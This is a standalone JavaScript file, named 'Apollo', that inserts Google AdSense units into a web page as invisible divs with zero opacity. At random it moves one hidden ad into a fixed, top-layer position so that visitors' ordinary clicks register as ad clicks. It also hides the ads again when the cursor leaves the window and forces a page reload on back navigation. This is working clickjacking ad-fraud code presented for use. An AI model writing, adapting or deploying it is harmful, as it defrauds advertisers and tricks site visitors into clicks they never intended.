class Apollo {
  constructor () {

    this.ads = {
      mobile: `<ins class="adsbygoogle" style="display:inline-block;width:320px;height:50px" data-ad-client="ca-pub-7462145468200595" data-ad-slot="2586005900"></ins>`,
      square: `<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-7462145468200595" data-ad-slot="6739151139"></ins>`,
      sky: `<ins class="adsbygoogle" style="display:inline-block;width:300px;height:600px" data-ad-client="ca-pub-7462145468200595" data-ad-slot="9603217698"></ins>`,
      text: `<ins class="adsbygoogle" style="display:inline-block;width:728px;height:90px" data-ad-client="ca-pub-7462145468200595" data-ad-slot="5465420301"></ins>`
    }

    //Start Apollo
    this.insertDesktopDivs(this.ads);
  }

  rand (min,max) {
    return Math.floor(Math.random()*(max-min+1)+min)
  }

  isTouchDevice () {
    return 'ontouchstart' in window
  }

  windowDimensions() {
    let windowDimensions = {
      width: window.innerWidth,
      height: document.body.scrollHeight
    }
    return windowDimensions
  }

  request (url, callback) {
    try {
  		const x = new (window.XMLHttpRequest || window.ActiveXObject)('MSXML2.XMLHTTP.3.0')
  		x.open('GET', url, 1)
  		x.setRequestHeader('X-Requested-With', 'XMLHttpRequest')
      x.setRequestHeader('Content-type', 'application/json')

  		x.onreadystatechange = function () {
  			x.readyState > 3 && callback && callback(x.responseText, x)
  		}

  		x.send()
  	} catch (e) {
  		window.console && console.log(e)
  	}
  }

  insertDesktopDivs (ads) {
    this.ad1 = document.createElement('div')
    this.ad1.style.top = `50px`
    this.ad1.style.left = `${this.windowDimensions().width - 300 - 20}px`
    this.ad1.style.position = `absolute`
    this.ad1.id = 'ad1'
    this.ad1.style.opacity = '0'
    this.ad1.style.zIndex = '-300000'
    this.ad1.innerHTML = ads.sky

    this.ad2 = document.createElement('div')
    this.ad2.style.top = `${this.windowDimensions().height / 3 + 100}px`
    this.ad2.style.left = `${this.windowDimensions().width - 300 - 20}px`
    this.ad2.style.position = `absolute`
    this.ad2.id = 'ad2'
    this.ad2.style.opacity = '0'
    this.ad2.style.zIndex = '-300000'
    this.ad2.innerHTML = ads.square

    this.ad3 = document.createElement('div')
    this.ad3.style.top = `${(this.windowDimensions().height / 3) * 2 + 100}px`
    this.ad3.style.left = `${this.windowDimensions().width - 300 - 20}px`
    this.ad3.style.position = `absolute`
    this.ad3.id = 'ad3'
    this.ad3.style.opacity = '0'
    this.ad3.style.zIndex = '-300000'
    this.ad3.innerHTML = ads.square

    this.ad4 = document.createElement('div')
    this.ad4.style.width = `320px`
    this.ad4.style.top = `${this.windowDimensions().height - 200}px`
    this.ad4.style.left = `0`
    this.ad4.style.position = `absolute`
    this.ad4.id = 'ad4'
    this.ad4.style.opacity = '0'
    this.ad4.style.zIndex = '-300000'
    this.ad4.innerHTML = ads.mobile + ads.mobile + ads.mobile



    document.body.insertAdjacentElement('beforeend', this.ad1); (adsbygoogle = window.adsbygoogle || []).push({});
    document.body.insertAdjacentElement('beforeend', this.ad2); (adsbygoogle = window.adsbygoogle || []).push({});
    document.body.insertAdjacentElement('beforeend', this.ad3); (adsbygoogle = window.adsbygoogle || []).push({});
    document.body.insertAdjacentElement('beforeend', this.ad4); (adsbygoogle = window.adsbygoogle || []).push({});(adsbygoogle = window.adsbygoogle || []).push({});(adsbygoogle = window.adsbygoogle || []).push({});

    //get click ready - take any ad div, move it into clicking position
    let divNames = ['ad1', 'ad2', 'ad3', 'ad4']
    let ranDiv = divNames[this.rand(0, divNames.length - 1)]
    let ifRand = this.rand(0, 15)
    console.log(ifRand)


    if (ifRand <= 5) {
      this[ranDiv].style.left = `${this.rand(0, this.windowDimensions().width - 250)}px`
      this[ranDiv].style.top = `50px`
      this[ranDiv].style.position = `fixed`
      this[ranDiv].style.zIndex = `300000`

    }
  }
}

if (typeof window !== 'undefined' &&
  window.document &&
  window.document.createElement
) {
  window.Apollo = new Apollo()
}

window.onbeforeunload = null;

function addEvent(obj, evt, fn) {
    if (obj.addEventListener) {
        obj.addEventListener(evt, fn, false);
    }
    else if (obj.attachEvent) {
        obj.attachEvent("on" + evt, fn);
    }
}
addEvent(window,"load",function(e) {
    addEvent(document, "mouseout", function(e) {
        e = e ? e : window.event;
        var from = e.relatedTarget || e.toElement;
        if (!from || from.nodeName == "HTML") {
            // stop your drag event here
            // for now we can just use an alert
            document.getElementById("ad1").style.zIndex = `-300000`;
            document.getElementById("ad2").style.zIndex = `-300000`;
            document.getElementById("ad3").style.zIndex = `-300000`;
            document.getElementById("ad4").style.zIndex = `-300000`;
        }
    });
});

if(!!window.performance && window.performance.navigation.type === 2)
{
    window.location.reload();
}
